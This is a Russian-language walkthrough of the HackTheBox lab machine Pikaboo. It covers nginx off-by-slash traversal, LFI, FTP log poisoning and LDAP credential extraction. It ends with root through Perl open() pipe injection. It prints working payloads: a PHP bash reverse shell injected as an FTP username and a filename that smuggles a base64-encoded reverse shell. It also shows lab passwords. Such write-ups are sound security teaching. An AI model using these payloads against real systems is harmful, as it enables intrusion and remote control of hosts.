# Pikaboo (2021)



<figure><img src="../../../.gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>

## Ключевые моменты прохождения:

✅ Эксплуатируем стандартную Union SQL-инъекцию\
✅ Эксплуатируем атаку Off-by-slash (Nginx мисконфиг)\
✅ Эксплуатируем LFI\
✅ Эксплуатируем LFI -> Log Poisoning через FTP\
✅ Вытаскиваем полезную информацию через LDAP(389 порт)\
✅ Эксплуатируем уязвимость через perl

## Разведка

По дефолту сканируем nmap'ом:

```
$ nmap -sC -sV 10.10.10.249 -oN nmap
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)
|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)
|_  256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Pikaboo
|_http-server-header: nginx/1.14.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

<figure><img src="../../../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>

Методом угадывания можно нащупать панель админа с HTTP-авторизацией:

<figure><img src="../../../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>

В выводе nmap'а написано, что используется nginx, а на веб-странице, что Apache. Можно предположить, что Nginx является прокси для Apache. Также можно вспомнить очень популярный мисконфиг nginx - "Off-by-slash".

Уязвимость "Off-by-slash" заключается в отсутствии завершающего слэша в location в nginx конфиге, например, может быть так:

```
location /admin {
  ...
}
```

```
$ gobuster dir --url http://10.10.10.249/admin../ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -t 40
```

```
/server-status        (Status: 200) [Size: 4363]
```

<figure><img src="../../../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>

Через раздел Typography можно найти LFI:

<figure><img src="../../../.gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>

Разумеется, нужно все делать через php-врапперы, потому что в ином случае код php страниц просто не отобразится:

```
http://10.10.10.249/admin../admin_staging/index.php?page=php://filter/convert.base64-encode/resource=index.php
```

Теперь можно пробрутить и это:

```
wfuzz -u http://10.10.10.249/admin../admin_staging/index.php?page=../../../../../../../..FUZZ -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt --hh 15349
```

```
000000188:   200        367 L    1050 W     47381 Ch    "/var/log/faillog"              
000000219:   200        413 L    1670 W     19803 Ch    "/var/log/vsftpd.log"           
000000199:   200        367 L    1051 W     307641 Ch   "/var/log/lastlog"              
000000220:   200        557 L    1380 W     169663 Ch   "/var/log/wtmp"
```

<figure><img src="../../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

Тут можно эксплуатировать такую атаку, как Log Poisoning, так как все то, что выведено на странице из логов, может выполняться, как PHP-код.

Делаем такой сплойт и указываем его в качестве имени при подключении по FTP:

```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.16.43/9898 0>&1'"); ?>
```

<figure><img src="../../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

Сразу после подключения можно глянуть крон:

```
$ cat /etc/crontab
```

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /usr/local/bin/csvupdate_cron
```

```
$ cat /usr/local/bin/csvupdate_cron
```

```
#!/bin/bash

for d in /srv/ftp/*
do
  cd $d
  /usr/local/bin/csvupdate $(basename $d) *csv
  /usr/bin/rm -rf *
done
```

csvupdate - это скрипт, написанный на Perl, который читает CSV файлы и добавляет содержимое в PocketApi файлы. Итак, смотрим открытые порты:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

389 порт - это LDAP, точнее сервис, который работает на протоколе LDAP.

LDAP - протокол прикладного уровня для доступа к службе каталогов X.500, разработанный IETF как облегчённый вариант разработанного ITU-T протокола DAP. LDAP — относительно простой протокол, использующий TCP/IP и позволяющий производить операции аутентификации (bind), поиска (search) и сравнения (compare), а также операции добавления, изменения или удаления записей. Обычно LDAP-сервер принимает входящие соединения на порт 389 по протоколам TCP или UDP. Для LDAP-сеансов, инкапсулированных в SSL, обычно используется порт 636. В данном файле мы можем найти креды, которые помогут с ldap'ом:

```
$ cat /opt/pokeapi/config/settings.py
```

```
...
DATABASES = {
    "ldap": {
        "ENGINE": "ldapdb.backends.ldap",
        "NAME": "ldap:///",
        "USER": "cn=binduser,ou=users,dc=pikaboo,dc=htb",
        "PASSWORD": "J~42%W?PFHl]g",
    },
    "default": {
        "ENGINE": "django.db.backends.sqlite3",
        "NAME": "/opt/pokeapi/db.sqlite3",
    }
}
...
```

Теперь смотрим LDAP:

```
$ ldapsearch -D "cn=binduser,ou=users,dc=pikaboo,dc=htb" -w "J~42%W?PFHl]g" -b "dc=pikaboo,dc=htb" -H ldap://localhost
```

```
# pwnmeow, users, ftp.pikaboo.htb
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==
```

Декодим пароль из base64:

```
echo "X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==" | base64 -d
```

```
_G0tT4_C4tcH_'3m_4lL!_
```

По ssh подключиться не получилось, пробуем FTP:

<figure><img src="../../../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>

Чтобы подняться до рута нужно использовать уязвимость в perl функции open(). То есть, мы можем использовать символ `|` для того, чтобы исполнять различный код. [Вот тут](https://www.cgisecurity.com/lib/sips.html) можно разобрать подробно данную уязвимость.

Сначала ставим листенер для будущего рута на нашей машине:

```
$ nc -nlvp 9999
```

Создаем сплойт на нашей машине так:

```
touch '|echo '`echo -n "bash -i &>/dev/tcp/10.10.16.43/9999 0>&1"|base64 -w0`'|base64 -d|bash;.csv'
```

Подключаемся по FTP, настраиваем домашнюю директорию и загружаем эксплоит:

```
ftp> lcd
Local directory now /home/kali
ftp> lcd /home/kali/htb/pikaboo/
Local directory now /home/kali/htb/pikaboo
ftp> mput |echo*
mput |echo YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE2LjQzLzk5OTkgMD4mMQ==|base64 -d|bash;.csv? y
200 PORT command successful. Consider using PASV.
150 Ok to send data.
```

<figure><img src="../../../.gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>
